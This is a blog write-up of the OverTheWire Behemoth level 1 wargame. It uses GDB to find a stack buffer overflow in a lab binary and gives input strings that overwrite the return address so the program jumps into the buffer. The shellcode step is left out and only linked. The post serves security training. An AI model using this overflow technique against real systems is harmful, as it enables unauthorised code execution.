---
layout: post
title: How to solve behemoth1 task or stack overflow showcase
---

The tasks have been taken from [overthewire.org](http://overthewire.org/wargames/behemoth/).

Login into the warbox:

```
    $ ssh behemoth1@behemoth.labs.overthewire.org -p 2221
    with the password you've obtained in `behemoth0`
```

Run and try to enter strings of various length:

```
    $ /behemoth/behemoth1
```

It's easy to find out that entering something longer than 75
symbols crashes the program. Congratulations, this is the stack
overflow problem.

`012345678901234567890123456789012345678901234567890123456789012345678901234`

Let's take a look at the file. It has `suid` bit as most of
the problems from the suite. `readelf` or `objdump` would not
show you anything interesting.

```
    $ cat /behemoth/behemoth0
```

Ok, go for GDB with:

```
    $ gdb -ix /usr/local/gdbinit/gdbinit /behemoth/behemoth1
    gdb$ func
    gdb$ dis main
```

You will see disassembled `main` listing. What is interesting
here, is that the function is very short and contains nothing but
immediate `puts` call responding with a failed authentication
right after the `gets` request for the password.

There is no password here. No password check. You have to exploit
stack overflow to gain access to the next flag. So here you go.

Set the breakpoint at last `leave` instruction, and calculate
size of the message for `ebp` and `eip` values on the stack.

```
    gdb$ b *0x0804847f
    gdb$ run < <(echo -ne "123123456789012345678901234567890123456789012345678901234567890123467890123\x00\x00\x00\x00\x00\x00\x00\x00")
    Breakpoint 1, 0x0804847f in main ()
    gdb$ hexdump $esp 7
```

`leave` instruction does a simple thing. It restores stack
pointer from the stack base and pops out `ebp` from the frame.
Next coming `rep` will pop `eip` from the stack top. Thus, you
have the following instructions:

```
    # https://c9x.me/x86/html/file_module_x86_id_154.html
    $esp = $ebp
    $ebp = pop()
    $eip = pop()

    # mem map
    00 00 00 00 00 00 00 00 | XX XX XX XX YY YY YY YY
                              ^ ebp register value
                                          ^ eip register value
```

So `eip` starts at

```
    gdb$ p $ebp+0x4
    $2 = (void *) 0xffffd5bc
```

Beginning of the buffer may be calculated tracing the instructions
in the `main` or right from the hex dump:

```
    gdb$ p $ebp-0x60-0x8+0x1d
    $1 = (void *) 0xffffd56d
```

Rerun program with `eip` replaced for the beginning of the buffer.

```
    gdb$ run < <(echo -ne "123123456789012345678901234567890123456789012345678901234567890123467890123\x00\x00\x00\x00\x6d\xd5\xff\xff")
    Breakpoint 1, 0x0804847f in main ()
    gdb$ n 2
    0xffffd56d in ?? ()
```

So, it works. We've got our process jumped right into the buffer.

Now, we need to load the input with a program to replace current
process with a `/bin/sh`.

...

Use obtained password to enter new a `/bin/sh`
shell and get a flag for the next warbox.

Links
===

- [Objdump - How to output text (eg ASCII strings) alongside assembly code?](https://reverseengineering.stackexchange.com/questions/14633/objdump-how-to-output-text-eg-ascii-strings-alongside-assembly-code)
- [convert a hex string to binary and send with netcat](https://unix.stackexchange.com/questions/82561/convert-a-hex-string-to-binary-and-send-with-netcat)
- [gdb - debugging with pipe](https://stackoverflow.com/questions/1456253/gdb-debugging-with-pipe?utm_medium=organic&utm_source=google_rich_qa&utm_campaign=google_rich_qa)
- [Linux/x64 - execve(/bin/sh) Shellcode (25 bytes)](https://www.exploit-db.com/exploits/39624/)
- [C shellcode explanation](https://security.stackexchange.com/questions/119959/c-shellcode-explanation/119978)
